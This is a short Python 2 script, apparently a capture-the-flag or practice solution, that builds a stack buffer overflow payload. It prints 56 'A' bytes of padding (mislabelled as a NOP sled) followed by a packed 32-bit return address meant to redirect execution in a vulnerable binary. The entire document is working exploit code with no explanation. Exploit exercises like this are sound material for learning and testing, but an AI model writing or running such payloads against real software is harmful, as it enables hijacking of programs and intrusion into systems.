import struct

addr = struct.pack("I", 0x08048482)
nopsled = "A" * 56

print nopsled + addr
